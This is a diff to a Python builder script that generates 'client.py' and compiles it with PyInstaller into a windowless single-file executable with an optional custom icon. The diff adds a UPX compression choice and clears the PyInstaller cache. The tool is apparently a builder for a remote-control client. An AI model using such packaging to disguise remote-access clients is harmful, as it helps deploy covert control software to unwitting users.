@@ -1,4 +1,4 @@
-import os, sys, socket
+import os, sys, socket, shutil
 
 # get the path to python install dir
 python_path = "\"" + os.path.dirname(sys.executable)
@@ -105,6 +105,15 @@ objClientFile = open("client.py", "w")
 objClientFile.writelines(arrFileContents)
 objClientFile.close()
 
+strUPXChoice = input("\n" + "Use UPX? y/n (Decreases file size but may not work on fresh computers): ")
+
+if strUPXChoice == "y":
+    strUPX = ""
+else:
+    # https://github.com/pyinstaller/pyinstaller/issues/3005
+    strUPX = "--noupx"
+    shutil.rmtree(os.environ["APPDATA"] + "/pyinstaller")
+
 
 strIconChoice = input("\n" + "Path for icon (Press ENTER to skip): ")
 
@@ -113,7 +122,7 @@ strIconChoice = strIconChoice.replace("\"", "")
 
 # if the user did not choose an icon build the client using pyinstaller
 if strIconChoice == "":
-    os.system(python_path + "/Scripts/pyinstaller\" client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed")
 # check to make sure the icon exists and that it is a .ico file
@@ -125,6 +134,6 @@ elif not strIconChoice.endswith(".ico"):
     sys.exit(0)
 else:
     # build the client with an icon
-    os.system(python_path + "/Scripts/pyinstaller\" client.py --exclude-module FixTk --exclude-module tcl --exclude-module tk "
+    os.system(python_path + "/Scripts/pyinstaller\" client.py " + strUPX + " --exclude-module FixTk --exclude-module tcl --exclude-module tk "
                       "--exclude-module _tkinter --exclude-module tkinter --exclude-module Tkinter "
                       "--onefile --windowed --icon=\"" + strIconChoice + "\"")
